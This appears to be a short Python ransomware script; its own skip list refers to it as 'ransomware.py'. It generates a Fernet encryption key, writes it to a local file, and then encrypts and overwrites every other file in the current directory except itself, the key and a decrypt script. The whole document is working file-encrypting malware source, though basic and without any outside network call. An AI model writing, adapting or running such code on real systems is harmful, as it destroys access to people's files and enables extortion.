from asyncore import write
import os
from cryptography.fernet import Fernet
windowsMainDir = 'C:'

files = []

key = Fernet.generate_key()
with open("key.key", 'wb') as key_arq:
    key_arq.write(key)
for file in os.listdir():
    if file == 'ransomware.py' or file == 'key.key' or file == 'decrypt.py':
        continue
    files.append(file)
for file in files:
    print(file)
    with open(file, 'rb') as write_file:

        content = write_file.read()
        print(content)
    encrypt_content = Fernet(key).encrypt(content)
    with open(file, 'wb') as encrypt:
        encrypt.write(encrypt_content)


